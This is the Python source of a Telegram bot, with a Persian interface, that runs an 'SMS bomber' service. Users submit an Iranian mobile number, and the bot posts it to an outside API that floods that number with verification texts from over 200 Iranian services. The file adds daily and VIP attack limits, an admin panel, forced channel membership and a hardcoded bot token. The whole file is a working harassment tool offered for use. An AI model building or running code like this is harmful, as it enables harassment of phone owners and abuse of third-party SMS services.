# -*- coding: utf-8 -*-
import telebot
from telebot import types
import requests
import threading
import time
from datetime import datetime, timedelta
import re

# ========== تنظیمات اصلی ==========
TOKEN = "8295266586:AAHGlLZC0Ha4-V1AOfsnJUd8xphqrVX5kBs"
ADMIN_ID = 8226091292
LIARA_API = "https://top-topye.liara.run/api/send_sms"

# ========== کانال و گروه‌ها (2 گروه و 1 کانال) ==========
REQUIRED_CHANNEL = "@top_topy_bomber"  # کانال اول
REQUIRED_GROUP1 = "https://t.me/+c5sZUJHnC8MxOGM0"  # گروه Los Angeles
REQUIRED_GROUP2 = "@BHOPYTNEAK"  # گروه دوم (سوپرگروه یا کانال)

bot = telebot.TeleBot(TOKEN)

# ========== لیست VIPها ==========
VIP_USERS = [
    8226091292,  # خودت (ادمین اصلی)
]

# ========== متغیرها ==========
user_states = {}
active_attacks = {}
user_daily = {}
DAILY_LIMIT_NORMAL = 5
DAILY_LIMIT_VIP = 20
bot_active = True
user_messages_count = {}
user_last_use = {}

# ========== توابع کمکی ==========
def is_vip(user_id):
    return user_id in VIP_USERS

def get_daily_limit(user_id):
    return DAILY_LIMIT_VIP if is_vip(user_id) else DAILY_LIMIT_NORMAL

# ========== تابع ارسال پیام عضویت (پیام اول) ==========
def send_membership_message(chat_id):
    """ارسال پیام با لینک‌های عضویت"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📢 کانال اصلی", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}")
    btn2 = types.InlineKeyboardButton("👥 گروه لس آنجلس", url=REQUIRED_GROUP1)
    btn3 = types.InlineKeyboardButton("👥 گروه دوم", url=f"https://t.me/{REQUIRED_GROUP2[1:]}")
    markup.add(btn1, btn2, btn3)
    
    bot.send_message(
        chat_id,
        "🔰 **برای استفاده از ربات، لطفاً عضو شو!**\n\n"
        "با عضویت در کانال و گروه‌های ما، از آخرین اخبار و آموزش‌ها باخبر میشی.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ========== خوش‌آمدگویی ==========
def get_welcome_message(user):
    name = user.first_name or "عزیز"
    limit = get_daily_limit(user.id)
    vip_status = "⭐ VIP" if is_vip(user.id) else "👤 عادی"
    
    return f"""🎯 **به ربات اس ام اس بمبر خوش اومدی {name}!**

🔥 **ساخته شده توسط @BHOPYTNEAK**
{vip_status}

📱 **قابلیت‌ها:**
• ارسال پیامک به بیش از ۲۰۰ سرویس ایرانی
• محدودیت روزانه: {limit} بار
• گزارش لحظه‌ای از تعداد پیامک‌های ارسالی
• قابلیت توقف حمله در هر لحظه

🔽 برای شروع از دکمه‌های زیر استفاده کن.
"""

# ========== استارت ==========
@bot.message_handler(commands=['start'])
def start(message):
    global bot_active
    user_id = message.from_user.id
    
    if not bot_active and user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ ربات در حال حاضر غیرفعال است.")
        return
    
    user_messages_count[user_id] = user_messages_count.get(user_id, 0) + 1
    
    # ارسال دو پیام پشت سر هم
    # پیام اول: عضویت
    send_membership_message(message.chat.id)
    
    # پیام دوم: منوی اصلی
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🚀 حمله جدید')
    btn2 = types.KeyboardButton('📊 وضعیت من')
    btn3 = types.KeyboardButton('📈 آمار کلی')
    btn4 = types.KeyboardButton('⛔ توقف حمله')
    btn5 = types.KeyboardButton('📞 ارتباط با سازنده')
    
    if user_id == ADMIN_ID:
        btn6 = types.KeyboardButton('👑 پنل مدیریت')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    else:
        markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, get_welcome_message(message.from_user), reply_markup=markup, parse_mode="Markdown")

# ========== پنل مدیریت ==========
@bot.message_handler(func=lambda m: m.text == '👑 پنل مدیریت' and m.from_user.id == ADMIN_ID)
def admin_panel(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('📊 آمار مدیریت', '📋 لیست VIPها', '🔴 خاموش/روشن', '📋 گزارش کاربران', '🔙 برگشت')
    bot.reply_to(m, "👑 پنل مدیریت:", reply_markup=markup)

# ========== لیست VIPها ==========
@bot.message_handler(func=lambda m: m.text == '📋 لیست VIPها' and m.from_user.id == ADMIN_ID)
def vip_list(m):
    if not VIP_USERS:
        bot.reply_to(m, "📋 لیست VIPها خالی هست.")
        return
    
    text = "📋 **لیست VIPها:**\n\n"
    for uid in VIP_USERS:
        text += f"👤 `{uid}`\n"
    text += f"\n👑 @BHOPYTNEAK"
    
    bot.reply_to(m, text, parse_mode="Markdown")

# ========== آمار مدیریت ==========
@bot.message_handler(func=lambda m: m.text == '📊 آمار مدیریت' and m.from_user.id == ADMIN_ID)
def admin_stats(m):
    active = len([x for x in active_attacks.values() if x])
    total_users = len(user_daily)
    today = datetime.now().date()
    today_users = len([u for u, d in user_daily.items() if d.get('date') == today])
    total_messages = sum(user_messages_count.values())
    status = "✅ فعال" if bot_active else "❌ غیرفعال"
    vip_count = len(VIP_USERS)
    
    msg = f"""📊 **آمار مدیریت:**
    
👤 کاربران کل: {total_users}
📅 کاربران امروز: {today_users}
⭐ VIPها: {vip_count}
⚡ حملات فعال: {active}
📨 کل پیام‌ها: {total_messages}
🔰 وضعیت ربات: {status}
👑 سازنده: @BHOPYTNEAK
"""
    bot.reply_to(m, msg, parse_mode="Markdown")

# ========== خاموش/روشن ==========
@bot.message_handler(func=lambda m: m.text == '🔴 خاموش/روشن' and m.from_user.id == ADMIN_ID)
def admin_toggle(m):
    global bot_active
    bot_active = not bot_active
    status = "روشن" if bot_active else "خاموش"
    bot.reply_to(m, f"✅ ربات {status} شد.")

# ========== گزارش کاربران ==========
@bot.message_handler(func=lambda m: m.text == '📋 گزارش کاربران' and m.from_user.id == ADMIN_ID)
def admin_users(m):
    report = "📋 **کاربران امروز:**\n\n"
    today = datetime.now().date()
    for uid, data in list(user_daily.items())[:10]:
        if data.get('date') == today:
            vip = "⭐" if is_vip(uid) else "👤"
            report += f"{vip} `{uid}`: {data.get('count', 0)} حمله\n"
    report += f"\n👑 @BHOPYTNEAK"
    bot.reply_to(m, report, parse_mode="Markdown")

# ========== برگشت ==========
@bot.message_handler(func=lambda m: m.text == '🔙 برگشت' and m.from_user.id == ADMIN_ID)
def admin_back(m):
    start(m)

# ========== ارتباط با سازنده ==========
@bot.message_handler(func=lambda m: m.text == '📞 ارتباط با سازنده')
def contact(m):
    markup = types.ForceReply(selective=False)
    msg = bot.reply_to(
        m, 
        "📝 **پیامت رو بنویس، برات می‌فرستم برای سازنده:**\n\n👑 @BHOPYTNEAK",
        reply_markup=markup,
        parse_mode="Markdown"
    )
    user_states[m.chat.id] = ("waiting_for_contact", msg.message_id)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) and user_states[m.chat.id][0] == "waiting_for_contact")
def handle_contact_message(m):
    state = user_states.get(m.chat.id)
    if not state:
        return
    
    vip = "⭐ VIP" if is_vip(m.from_user.id) else "👤 عادی"
    user_info = f"از: {m.from_user.first_name} (ID: {m.from_user.id})\nوضعیت: {vip}"
    
    del user_states[m.chat.id]
    
    bot.send_message(
        ADMIN_ID,
        f"📨 **پیام جدید از کاربر:**\n\n{user_info}\n\n📝 {m.text}",
        parse_mode="Markdown"
    )
    
    bot.reply_to(m, "✅ پیامت با موفقیت ارسال شد. به زودی پاسخ می‌دم.\n👑 @BHOPYTNEAK")

# ========== آمار کلی ==========
@bot.message_handler(func=lambda m: m.text == '📈 آمار کلی')
def global_stats(m):
    total_users = len(user_daily)
    today = datetime.now().date()
    today_users = len([u for u, d in user_daily.items() if d.get('date') == today])
    total_messages = sum(user_messages_count.values())
    vip_count = len(VIP_USERS)
    
    msg = f"""📊 **آمار کلی ربات:**

👥 کاربران کل: {total_users}
📅 کاربران امروز: {today_users}
⭐ کاربران VIP: {vip_count}
📨 کل درخواست‌ها: {total_messages}
⚡ محدودیت عادی: {DAILY_LIMIT_NORMAL} بار
⚡ محدودیت VIP: {DAILY_LIMIT_VIP} بار

👑 **ساخته شده توسط @BHOPYTNEAK**"""
    
    bot.reply_to(m, msg, parse_mode="Markdown")

# ========== وضعیت من ==========
@bot.message_handler(func=lambda m: m.text == '📊 وضعیت من')
def my_status(m):
    user_id = m.chat.id
    limit = get_daily_limit(user_id)
    vip_status = "⭐ VIP" if is_vip(user_id) else "👤 عادی"
    
    today_used = 0
    if user_id in user_daily and user_daily[user_id].get('date') == datetime.now().date():
        today_used = user_daily[user_id].get('count', 0)
    
    remaining = limit - today_used
    
    status_text = f"""📊 **وضعیت شما:**

👤 کاربر: {m.from_user.first_name}
{vip_status}
📅 امروز استفاده کردی: {today_used} بار
✅ باقیمانده امروز: {remaining} بار
⚡ محدودیت روزانه: {limit} بار
"""
    
    if user_id in active_attacks and active_attacks[user_id]:
        status_text += "\n⚠️ **حمله در حال انجام هست!**"
    else:
        status_text += "\n✅ **آماده برای حمله جدیدی!**"
    
    if user_id in user_last_use:
        last_time = user_last_use[user_id]
        time_diff = int(time.time() - last_time)
        if time_diff < 120:
            wait = 120 - time_diff
            status_text += f"\n⏳ زمان انتظار تا حمله بعد: {wait} ثانیه"
    
    status_text += f"\n\n👑 @BHOPYTNEAK"
    
    bot.reply_to(m, status_text, parse_mode="Markdown")

# ========== حمله جدید ==========
@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
def new_attack(m):
    global bot_active
    user_id = m.chat.id
    limit = get_daily_limit(user_id)
    
    if not bot_active and user_id != ADMIN_ID:
        bot.reply_to(m, "⛔ ربات غیرفعال است.")
        return
    
    # بررسی محدودیت روزانه
    if user_id in user_daily and user_daily[user_id].get('date') == datetime.now().date():
        if user_daily[user_id].get('count', 0) >= limit and user_id != ADMIN_ID:
            bot.reply_to(m, f"⚠️ محدودیت روزانه تموم شد! فردا {limit} بار دیگه می‌تونی استفاده کنی.")
            return
    
    # بررسی فاصله زمانی
    if user_id in user_last_use:
        time_diff = int(time.time() - user_last_use[user_id])
        if time_diff < 120 and user_id != ADMIN_ID:
            remaining = 120 - time_diff
            bot.reply_to(m, f"⏳ {remaining} ثانیه صبر کن بین هر حمله.")
            return
    
    # بررسی حمله فعال
    if user_id in active_attacks and active_attacks[user_id]:
        bot.reply_to(m, "⚠️ الان یه حمله فعال داری! اول تموم شه بعد دوباره تلاش کن.")
        return
    
    user_states[user_id] = "waiting_for_phone"
    bot.reply_to(m, "📱 **شماره موبایل رو بفرست:**\n(مثلاً 09123456789)")

# ========== دریافت شماره ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting_for_phone")
def get_phone(m):
    user_id = m.chat.id
    phone = m.text.strip()
    
    if not re.match(r'^09\d{9}$', phone):
        bot.reply_to(m, "❌ شماره نامعتبر! باید ۱۱ رقم و با ۰۹ شروع بشه.")
        return
    
    del user_states[user_id]
    user_last_use[user_id] = time.time()
    active_attacks[user_id] = True
    
    # ثبت آمار
    if user_id in user_daily and user_daily[user_id].get('date') == datetime.now().date():
        user_daily[user_id]['count'] += 1
    else:
        user_daily[user_id] = {'date': datetime.now().date(), 'count': 1}
    
    limit = get_daily_limit(user_id)
    remaining = limit - user_daily[user_id]['count']
    
    msg = bot.reply_to(
        m, 
        f"✅ شماره {phone} دریافت شد.\n🔥 در حال ارسال پیامک...\n📊 باقیمانده امروز: {remaining} بار"
    )
    
    threading.Thread(target=run_attack, args=(phone, user_id, msg.message_id)).start()

# ========== اجرای حمله ==========
def run_attack(phone, chat_id, msg_id):
    try:
        response = requests.post(LIARA_API, json={'phone': phone}, timeout=60)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                result = data.get('result', {})
                success = result.get('success', 0)
                total = result.get('total', 0)
                percent = int((success / total) * 100) if total > 0 else 0
                
                final_msg = f"""✅ **حمله با موفقیت انجام شد!**

📱 شماره: {phone}
✅ موفق: {success}
❌ ناموفق: {total - success}
📊 مجموع: {total}
📈 درصد موفقیت: {percent}%

👑 @BHOPYTNEAK"""
                
                bot.edit_message_text(final_msg, chat_id, msg_id, parse_mode="Markdown")
            else:
                bot.edit_message_text("❌ خطا در حمله", chat_id, msg_id)
        else:
            bot.edit_message_text(f"❌ خطا: {response.status_code}", chat_id, msg_id)
    except Exception as e:
        bot.edit_message_text(f"❌ خطا: {str(e)}", chat_id, msg_id)
    finally:
        if chat_id in active_attacks:
            del active_attacks[chat_id]

# ========== توقف حمله ==========
@bot.message_handler(func=lambda m: m.text == '⛔ توقف حمله')
def stop_attack(m):
    user_id = m.chat.id
    if user_id in active_attacks:
        active_attacks[user_id] = False
        bot.reply_to(m, "⛔ حمله متوقف شد.")
    else:
        bot.reply_to(m, "❌ حمله فعالی نیست.")

# ========== پیام‌های ناشناخته ==========
@bot.message_handler(func=lambda m: True)
def fallback(m):
    # اگه کاربر در حالت انتظار برای شماره هست، نباید اینجا بیاد
    if user_states.get(m.chat.id) == "waiting_for_phone":
        return
    
    # اگه کاربر در حالت انتظار برای پیام به سازنده هست، نباید اینجا بیاد
    if user_states.get(m.chat.id) and user_states[m.chat.id][0] == "waiting_for_contact":
        return
    
    # اگه پیام یکی از دکمه‌های معتبر هست، قبلاً هندلر مخصوص خودش اجرا شده
    valid_buttons = ['🚀 حمله جدید', '📊 وضعیت من', '📈 آمار کلی', '⛔ توقف حمله', 
                     '📞 ارتباط با سازنده', '👑 پنل مدیریت', '📊 آمار مدیریت', 
                     '📋 لیست VIPها', '🔴 خاموش/روشن', '📋 گزارش کاربران', '🔙 برگشت']
    
    if m.text in valid_buttons:
        return
    
    bot.reply_to(m, "⚠️ لطفاً از دکمه‌های منو استفاده کن.")

# ========== اجرا ==========
if __name__ == "__main__":
    print("🤖 ربات راه‌اندازی شد")
    print(f"👑 سازنده: @BHOPYTNEAK")
    print(f"⭐ تعداد VIPها: {len(VIP_USERS)}")
    print(f"📢 کانال: {REQUIRED_CHANNEL}")
    print(f"👥 گروه 1: {REQUIRED_GROUP1}")
    print(f"👥 گروه 2: {REQUIRED_GROUP2}")
    bot.infinity_polling()
